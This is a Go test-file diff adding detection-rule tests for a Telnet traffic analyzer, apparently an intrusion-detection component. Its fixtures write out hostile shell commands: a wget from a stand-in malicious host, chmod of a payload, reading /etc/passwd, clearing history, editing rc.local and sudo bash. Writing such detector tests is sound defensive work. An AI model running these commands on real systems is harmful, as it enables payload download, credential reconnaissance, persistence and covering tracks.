@@ -676,5 +676,101 @@ func TestTelnetCredFingerprint_NoPlaintext(t *testing.T) {
 	}
 }
 
+// ─────────────────────────────────────────────────────────────────────────────
+// Track 2: Command/Behavioral Detection Rules
+// ─────────────────────────────────────────────────────────────────────────────
+
+func TestTelnetTrack2_Download(t *testing.T) {
+	a, sub := newTelnetTest()
+	authFlow(a, "cmd1", "10.0.0.1", "root", "toor")
+	// Send authenticated command
+	a.Analyze("cmd1", "10.0.0.1", 54321, 23, []byte("wget http://malicious.com/payload.sh\r\n"), true)
+	time.Sleep(5 * time.Millisecond)
+	if !sub.hasID("TELNET-DOWNLOAD-001") {
+		t.Fatal("Expected TELNET-DOWNLOAD-001 for wget command")
+	}
+}
+
+func TestTelnetTrack2_Botnet(t *testing.T) {
+	a, sub := newTelnetTest()
+	authFlow(a, "cmd2", "10.0.0.1", "root", "toor")
+	a.Analyze("cmd2", "10.0.0.1", 54321, 23, []byte("chmod +x payload.sh\r\n"), true)
+	time.Sleep(5 * time.Millisecond)
+	if !sub.hasID("TELNET-BOTNET-001") {
+		t.Fatal("Expected TELNET-BOTNET-001 for chmod +x")
+	}
+}
+
+func TestTelnetTrack2_Recon(t *testing.T) {
+	a, sub := newTelnetTest()
+	authFlow(a, "cmd3", "10.0.0.1", "root", "toor")
+	a.Analyze("cmd3", "10.0.0.1", 54321, 23, []byte("cat /etc/passwd\r\n"), true)
+	time.Sleep(5 * time.Millisecond)
+	if !sub.hasID("TELNET-RECON-001") {
+		t.Fatal("Expected TELNET-RECON-001 for cat /etc/passwd")
+	}
+}
+
+func TestTelnetTrack2_DefenseEvasion(t *testing.T) {
+	a, sub := newTelnetTest()
+	authFlow(a, "cmd4", "10.0.0.1", "root", "toor")
+	a.Analyze("cmd4", "10.0.0.1", 54321, 23, []byte("history -c\r\n"), true)
+	time.Sleep(5 * time.Millisecond)
+	if !sub.hasID("TELNET-DEFENSE-EVASION-001") {
+		t.Fatal("Expected TELNET-DEFENSE-EVASION-001 for history -c")
+	}
+}
+
+func TestTelnetTrack2_Persist(t *testing.T) {
+	a, sub := newTelnetTest()
+	authFlow(a, "cmd5", "10.0.0.1", "root", "toor")
+	a.Analyze("cmd5", "10.0.0.1", 54321, 23, []byte("echo 'x' >> /etc/rc.local\r\n"), true)
+	time.Sleep(5 * time.Millisecond)
+	if !sub.hasID("TELNET-PERSIST-001") {
+		t.Fatal("Expected TELNET-PERSIST-001 for rc.local modification")
+	}
+}
+
+func TestTelnetTrack2_Privesc(t *testing.T) {
+	a, sub := newTelnetTest()
+	authFlow(a, "cmd6", "10.0.0.1", "root", "toor")
+	a.Analyze("cmd6", "10.0.0.1", 54321, 23, []byte("sudo bash\r\n"), true)
+	time.Sleep(5 * time.Millisecond)
+	if !sub.hasID("TELNET-PRIVESC-001") {
+		t.Fatal("Expected TELNET-PRIVESC-001 for sudo command")
+	}
+}
+
+func TestTelnetTrack2_Config(t *testing.T) {
+	a, sub := newTelnetTest()
+	authFlow(a, "cmd7", "10.0.0.1", "admin", "admin")
+	a.Analyze("cmd7", "10.0.0.1", 54321, 23, []byte("conf t\r\n"), true)
+	time.Sleep(5 * time.Millisecond)
+	if !sub.hasID("TELNET-CONFIG-001") {
+		t.Fatal("Expected TELNET-CONFIG-001 for router configuration change")
+	}
+}
+
+func TestTelnetTrack2_OversizedCommand(t *testing.T) {
+	a, sub := newTelnetTest()
+	authFlow(a, "cmd8", "10.0.0.1", "admin", "admin")
+	
+	// Send 5000 'a' characters followed by \r\n
+	bigCmd := strings.Repeat("a", 5000)
+	a.Analyze("cmd8", "10.0.0.1", 54321, 23, []byte(bigCmd+"\r\n"), true)
+	time.Sleep(5 * time.Millisecond)
+	
+	// Should not crash, and should not trigger rules (it's junk)
+	a.mu.Lock()
+	sess := a.sessions["cmd8"]
+	bufLen := len(sess.cmdBuf)
+	a.mu.Unlock()
+	
+	if bufLen > 4096 {
+		t.Fatalf("Expected cmdBuf to be bounded (<= 4096), but got %d", bufLen)
+	}
+	_ = sub
+}
+
 // Ensure binary.BigEndian is available (imported for test helpers in other test files)
 var _ = binary.BigEndian
